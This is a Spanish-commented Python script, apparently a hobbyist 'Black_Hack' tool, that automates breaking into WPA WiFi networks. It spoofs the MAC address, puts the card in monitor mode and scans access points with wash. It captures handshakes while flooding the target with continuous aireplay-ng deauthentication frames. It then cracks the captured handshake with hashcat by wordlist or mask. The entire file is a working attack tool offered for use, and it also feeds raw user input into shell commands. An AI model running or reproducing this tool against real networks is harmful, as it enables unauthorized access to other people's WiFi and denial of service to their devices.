#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading
from io import open
## Crador Smp_A
# Fecha 25.7.2020
# Licencia Open soft GNU
# Nombre programa Rambo WiFi telefono
# Tipo Script shell
# Hack pin wps Wifi basado en craking rainbow
# lenguaje Python3 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet        Smp_A')
print("		 Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["opciones:","1) selec Wlan & changer Mac" ,"2) Scaner red ", "3) capture", "4) crack", "5) Exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
	print(listamenu[5])

global bssid
global canal
global diccionario
global caracter
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def config():
	global wlan
	while True:
		try:
			os.system("ifconfig")
			wlan=input("Introduzca Wlan: ")
			print("Procesando")
			os.system('ip link set '+wlan+' up')
			os.system('airmon-ng check kill')
			os.system('ifconfig '+wlan+' down')
			os.system('macchanger -A '+wlan)
			os.system('ifconfig '+wlan+' up')
			time.sleep(2) 
			os.system('airmon-ng start '+wlan)
			print(wlan)
			return wlan
			break
		except TypeError:
			print("Wlan no permitida")

def scan(wlan):
	global bssid
	global canal
	global diccionario
	global caracter
	global dic
	while True:
		try:
			os.system('wash -i '+wlan)
			bssid=input("seleccione BSSID : ")
			canal=input("seleccione CHANEL : ")
			dic=input("Desea seleccionar diccionario? y o n :")
			if(dic=='y'):
				diccionario=input("Introduzca ruta diccionario: ")
				caracter=1
			else:
				caracter=input("Introduzca caracteres:")
				diccionario=1
			return bssid, canal, diccionario, dic, caracter
			break
		except TypeError:
			print("Wlan no permitida")

def attack(wlan,bssid,canal):
	os.system('x-terminal-emulator -e airodump-ng -c '+canal+' -w file --bssid '+bssid+' '+wlan)
	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')

def crack(diccionario,dic,caracter):
	os.system('./cap2hccapx.bin /root/Especial_termux_kali/file-01.cap /root/Especial_termux_kali/file-01.hccapx')
	if(dic=='y'):
		os.system('x-terminal-emulator -e hashcat -m 2500 /root/Especial_termux_kali/file-01.hccapx '+ diccionario)
	else:
		os.system('x-terminal-emulator -e hashcat -m 2500 -a3 /root/Especial_termux_kali/file-01.hccapx '+caracter)


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		config()
	elif (key==2):
		scan(wlan)
	elif (key==3):
		attack(wlan,bssid,canal)
	elif (key==4):
		crack(diccionario,dic,caracter)

	elif (key==5):
		#os.syste('airmon-ng stop wlan0mon')
		#os.syste('ifconfig wlan0 down')
		#os.syste('iwconfig wlan0 mode managed')
		#os.syste('ifconfig wlan0 up')
		#os.system('service network-manager start')
		exit=True
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
